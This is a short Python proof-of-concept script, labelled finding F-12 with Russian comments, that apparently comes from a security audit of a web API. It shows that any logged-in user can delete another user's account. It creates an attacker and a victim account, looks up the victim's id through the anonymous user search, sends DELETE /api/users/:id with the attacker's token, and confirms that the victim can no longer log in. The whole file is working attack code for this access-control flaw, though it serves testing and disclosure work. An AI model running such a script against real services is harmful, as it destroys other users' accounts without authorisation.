# -*- coding: utf-8 -*-
"""F-12. Любой вошедший пользователь удаляет чужой DELETE /api/users/:id.
Идентификатор берётся из анонимного поиска.
"""
import time

from _http import Client, parser


def main():
    p = parser("Удаление чужой учётки")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    attacker = client.register(f"delby{stamp}", f"delby{stamp}@poc.local", "Passw0rd!delby")
    victim_email = f"victimdel{stamp}@poc.local"
    victim_name = f"victimdel{stamp}"
    victim_pass = "Passw0rd!victimdel"
    client.register(victim_name, victim_email, victim_pass)

    status, data, raw = client.call("GET", f"/api/users/search?q={victim_name}")
    if status != 200 or not data["profiles"]:
        raise SystemExit(f"жертва не найдена поиском: {status} {raw[:200]!r}")
    vid = data["profiles"][0]["id"]
    status, _, raw = client.call("DELETE", f"/api/users/{vid}", token=attacker)
    if status != 200:
        raise SystemExit(f"удаление отклонено: {status} {raw[:200]!r}")
    status, _, _ = client.call(
        "POST",
        "/api/users/login",
        body={"user": {"email": victim_email, "password": victim_pass}},
    )
    if status == 200:
        raise SystemExit("жертва всё ещё входит")
    print(f"OK удалён id={vid} {victim_email}, повторный логин={status}")


if __name__ == "__main__":
    main()
